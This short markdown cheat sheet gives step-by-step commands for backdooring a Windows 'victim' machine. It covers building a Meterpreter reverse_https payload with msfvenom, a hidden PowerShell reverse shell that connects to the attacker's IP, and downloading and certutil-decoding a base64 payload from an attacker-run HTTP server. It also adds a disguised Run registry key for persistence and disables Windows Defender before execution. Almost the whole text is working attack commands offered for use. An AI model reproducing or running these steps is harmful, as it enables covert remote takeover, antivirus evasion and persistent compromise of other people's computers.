
## Create Backdoor
```
msfvenom -p windows/meterpreter/reverse_https lhost=[your ip] lport=[your port]  -f exe -o backdoor.exe
```
## Encode Backdoor
Go to [Here](https://www.base64encode.org) to Encode Backdoor

## Netcat
``` bash
nc -lvnp [Your port]
```
## Victim
Run this in Victim Computer
``` powershell
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('[your ip]', [your port]);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```
## Make Directory
Make Directory to save backdoor
``` bash
mkdir c:\Users\[User_name]\AppData\LocalLow\Temp
```
## Use python to make server

``` bash
python -m http.server
```
## Download String base64 backdoor
Download String From Your Server Python
``` powershell
(New-Object System.Net.WebClient).DownloadString(http://example.com/file-encode.txt)
```
## Ddecode Base64

``` powershell
certutil -decode c:\Users\[User Name]\AppData\LocalLow\Temp\file-encode.txt c:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe
```
## Create Regkey
Create a Regkey to execute Backdoor when start Windows 
``` powershell
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "Sys" -Value "c:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe" -PropertyType "String"
```
## Msfconsole
Run msfconsole

- Use exploit handler
```
use exploit/multi/handler
```
- Set Payload
```
set payload windows/meterpreter/reverse_https
```
- Set Lhost
```
set lhost [your ip] 
```
- Set lport
```
set lport [your port]
```
- Run
```
run 
```
## Disable Windows Defender
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
## Unlock Backdoor
```
Unblock-File -Path c:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe
```
## Execute Backdoor
```
./decode.exe
```
